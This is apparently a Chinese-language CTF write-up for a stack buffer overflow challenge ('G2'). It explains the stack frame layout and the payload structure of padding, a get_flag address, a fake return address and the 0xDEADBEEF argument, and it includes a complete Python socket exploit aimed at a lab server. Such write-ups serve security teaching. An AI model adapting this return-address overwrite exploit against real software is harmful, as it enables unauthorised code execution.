# 系统层漏洞利用与逆向分析-DEP数据执行保护利用-G2 WriteUp

本题与G1类似，但有两点变化：
- buff长度从 64 变为 128
- `get_flag` 函数的参数从栈中获取并进行校验是否是`0xDEADBEEF`

get_flag函数：

```c
void __cdecl get_flag(int param_1)

{
                    /* 0x1000  1  get_flag */
  if (param_1 != -0x21524111) {
    print(0x41d000); // 打印"Wrong key: 0x%08X"
    return;
  }
  GetFlag();
                    /* WARNING: Subroutine does not return */
  ExitProcess(0);
}
```

一般情况下的栈帧结构：

```
高地址
+----------------+
|   第2个参数     |
+----------------+
|   第1个参数     | ← [EBP+8]
+----------------+
|   返回地址      | ← [EBP+4]
+----------------+
|   保存的 EBP    | ← [EBP]
+----------------+
| buff[124~127]  |
+----------------+
| buff[120~123]  |
+----------------+
|      ...       |
+----------------+
| buff[4~7]      |
+----------------+
| buff[0~3]      |
+----------------+
低地址
```

payload的第一部分自然是 128+4 字节的填充用于覆盖buff和EBP，接着是`get_flag`函数的地址，最后是`get_flag`函数参数

需要注意的是，get_flag函数的地址之后需要再填充一个内容不限的假返回地址。因为如果参数紧跟在返回地址之后，会被解释为：`调用get_flag这个函数的函数的返回地址`，而不是`get_flag函数的参数`。所以需要在返回地址之后再填充一个假返回地址。

获取token的代码：

```python
import socket
import struct
import ctypes

# 获取token的服务器地址，固定
TARGET_HOST = "172.17.84.102"
TARGET_PORT = 9999

GET_FLAG = 0x00401000 # get_flag函数地址
OFFSET = 132 # 栈偏移
param1 = ctypes.c_uint32(-0x21524111).value  # 将负数转换为无符号整数0xDEADBEEF

def get_token():
    payload = b"A" * OFFSET
    payload += struct.pack("<I", GET_FLAG)
    payload += struct.pack("<I", GET_FLAG) # 填充假返回地址，内容不限
    payload += struct.pack("<I", param1)
    payload += b"\n"

    with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10) as sock:
        sock.settimeout(5)

        banner = sock.recv(1024)
        print(banner.decode(errors="replace"), end="")

        sock.sendall(payload)

        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break

    text = response.decode(errors="replace")
    print(text)

    return text

if __name__ == "__main__":
    get_token()
```